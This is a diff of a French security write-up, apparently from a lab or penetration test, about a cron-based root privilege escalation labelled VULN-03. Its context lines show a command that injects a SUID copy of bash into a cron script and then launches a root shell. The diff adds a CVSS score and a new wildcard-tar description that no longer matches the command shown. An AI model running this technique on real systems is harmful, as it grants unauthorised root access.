@@ -55,7 +55,8 @@ echo 'cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> /chemin/script.sh
 /tmp/bash -p
 ```
 
-C'est le vecteur documenté comme VULN-03 dans le rapport EvilCorp — le script cron était modifiable par le groupe.
+C'est le vecteur documenté comme VULN-03 dans le rapport EvilCorp — tâche cron root avec wildcard tar.
+CVSS 3.1 : 7.8 High (`AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`), source rapport EvilCorp mai 2026.
 
 ---
 
